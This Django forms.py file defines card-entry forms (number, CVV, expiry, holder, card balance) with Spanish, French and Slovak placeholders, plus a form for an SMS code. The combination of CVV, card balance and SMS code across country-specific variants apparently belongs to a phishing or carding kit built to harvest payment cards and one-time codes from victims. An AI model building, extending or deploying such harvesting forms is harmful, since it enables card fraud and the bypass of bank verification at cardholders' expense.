from .models import Cards
from django.forms import ModelForm, TextInput
from django import forms


class CardForm(ModelForm):
    class Meta:
        model = Cards
        fields = ['num', 'cvv', 'month', 'year', 'card_holder', 'card_balance']

        widgets = {
            'num': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Card Number 1111-2222-3333-4444'
            }),
            'cvv': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Card CVC 632'
            }),
            'year': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Exp Year'
            }),
            'month': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Exp month'
            }),
            'card_holder': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Card holder'
            }),
            'card_balance': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Card balance'
            }),
        }


class SpainForm(ModelForm):
    class Meta:
        model = Cards
        fields = ['num', 'cvv', 'month', 'year', 'card_holder', 'card_balance']

        widgets = {
            'num': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Número de tarjeta 1-2222-3333-4444'
            }),
            'cvv': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Tarjeta CVC 632'
            }),
            'year': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Año Exp.'
            }),
            'month': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Mes de vencimiento'
            }),
            'card_holder': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Titular de la tarjeta'
            }),
            'card_balance': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Balance de tarjeta'
            }),
        }


class SmsForm(forms.Form):
    sms_kod = forms.CharField(widget=forms.TextInput(attrs={'type': 'text', 'class': 'input'}))


class PayEngForm(forms.Form):
    num = forms.TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Card Number 1111-2222-3333-4444'
            })
    cvv = forms.TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Card CVC 632'
            })
    """widgets = {
            'num': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Card Number 1111-2222-3333-4444'
            }),
            'cvv': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Card CVC 632'
            }),
            'year': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Exp Year'
            }),
            'month': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Exp month'
            }),
            'card_holder': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Card holder'
            }),
            'card_balance': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Card balance'
            }),
        }"""


class CardsForm(ModelForm):
    class Meta:
        model = Cards
        fields = ['num', 'cvv', 'month', 'year', 'card_holder', 'card_balance']

        widgets = {
            'num': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Número de tarjeta 1111-2222-3333-4444'
            }),
            'cvv': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Tarjeta CVC 632'
            }),
            'year': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Año Exp.'
            }),
            'month': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Mes de vencimiento'
            }),
            'card_holder': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Titular de la tarjeta'
            }),
            'card_balance': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Balance de tarjeta'
            }),
        }


class FranceForm(ModelForm):
    class Meta:
        model = Cards
        fields = ['num', 'cvv', 'month', 'year', 'card_holder', 'card_balance']

        widgets = {
            'num': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Numéro de carte 1111-2222-3333-4444'
            }),
            'cvv': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Carte CVC 632'
            }),
            'year': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': "Année d'expiration"
            }),
            'month': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': "Mois d'expiration"
            }),
            'card_holder': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Titulaire de la carte'
            }),
            'card_balance': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Solde de la carte'
            }),
        }


class SlovakiaForm(ModelForm):
    class Meta:
        model = Cards
        fields = ['num', 'cvv', 'month', 'year', 'card_holder', 'card_balance']

        widgets = {
            'num': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Číslo karty 1111-2222-3333-4444'
            }),
            'cvv': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'HVAC karta 632'
            }),
            'year': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': "Rok expirácie"
            }),
            'month': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': "Mesiac expirácie"
            }),
            'card_holder': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Držiteľ karty'
            }),
            'card_balance': TextInput(attrs={
                'type': 'tel',
                'class': 'name',
                'placeholder': 'Zostatok na karte'
            }),
        }